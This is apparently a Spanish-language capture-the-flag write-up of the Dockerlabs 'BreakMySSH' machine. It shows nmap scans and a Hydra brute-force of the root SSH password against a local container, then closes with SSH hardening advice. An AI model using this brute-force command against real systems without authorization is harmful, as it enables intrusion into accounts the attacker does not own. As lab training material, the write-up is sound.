# Resumen Técnico: Resolución de Máquina BreakMySSH (Dockerlabs)

## Información General
* **Plataforma:** Dockerlabs
* **Máquina:** BreakMySSH
* **Dificultad:** Muy Fácil
* **Objetivo:** Obtener acceso con privilegios de `root`.
* **Vector de Ataque:** Fuerza bruta contra el servicio OpenSSH (Puerto 22) seguido de un acceso directo con la cuenta de superusuario.

---

## Flujo de Trabajo (Paso a Paso)

### 1. Despliegue de la Máquina

Se inicia el laboratorio en el entorno local utilizando el script de autodeploy de Dockerlabs.

```bash
sudo auto_deploy breakmyssh.tar
```

![Despliegue de la máquina](01-autodeploy.jpeg)

---

### 2. Reconocimiento y Escaneo de Puertos

Se realiza un escaneo de puertos TCP sobre la dirección IP del contenedor (`172.17.0.2`) para identificar servicios activos.

```bash
nmap -p- --open -sS --min-rate 5000 -n -Pn 172.17.0.2 -oN puertos.txt
```

**Resultado:** El puerto `22/tcp` (SSH) se encuentra abierto.

![Escaneo de puertos con Nmap](02-nmap-puertos.jpeg)

---

### 3. Detección de Servicios y Versiones

Se ejecuta un escaneo enfocado en el puerto 22 para determinar la versión exacta del servicio.

```bash
nmap -sCV -p22 172.17.0.2 -oN servicios.txt
```

**Resultado:** El puerto corre OpenSSH 7.7.

![Detección de servicios con Nmap](03-nmapservicios.jpeg)

---

### 4. Explotación (Fuerza Bruta SSH)

Dado que no existen otros vectores expuestos, se realiza un ataque de fuerza bruta contra el servicio SSH utilizando Hydra y un diccionario de contraseñas.

```bash
hydra -l root -P /ruta/a/rockyou.txt ssh://172.17.0.2 -t 4 -V
```

**Resultado:** Se identifican credenciales válidas para el usuario `root`.

![Ataque de fuerza bruta con Hydra - Parte 1](04-hidra.jpeg)

![Ataque de fuerza bruta con Hydra - Parte 2](04-hidra2.jpeg)

---

### 5. Post-Explotación y Verificación

Se inicia sesión mediante SSH utilizando las credenciales obtenidas para confirmar el acceso total al sistema.

```bash
ssh root@172.17.0.2
whoami
id
```

**Resultado:** Confirmado `uid=0(root)`.

![Conexión SSH y verificación de privilegios - Parte 1](05-ssh-root)

![Conexión SSH y verificación de privilegios - Parte 2](05-ssh-root2.jpeg)

---

## Remediación y Buenas Prácticas de Seguridad

Para mitigar los riesgos asociados a los ataques de fuerza bruta en servicios SSH, se deben aplicar las siguientes medidas defensivas en entornos de producción:

1. **Deshabilitar la autenticación directa de root:**  
   En el archivo `/etc/ssh/sshd_config`, establezca:
   ```text
   PermitRootLogin no
   ```

2. **Desactivar la autenticación basada en contraseñas:**  
   Forzar el uso exclusivo de llaves SSH (claves públicas/privadas):
   ```text
   PasswordAuthentication no
   ```

3. **Implementar controles de bloqueo de intentos (Fail2ban):**  
   Configurar herramientas de prevención de intrusiones para bloquear direcciones IP que acumulen múltiples intentos fallidos de autenticación.

4. **Política de contraseñas robustas:**  
   Asegurar que todas las cuentas del sistema utilicen contraseñas complejas que no figuren en diccionarios conocidos.
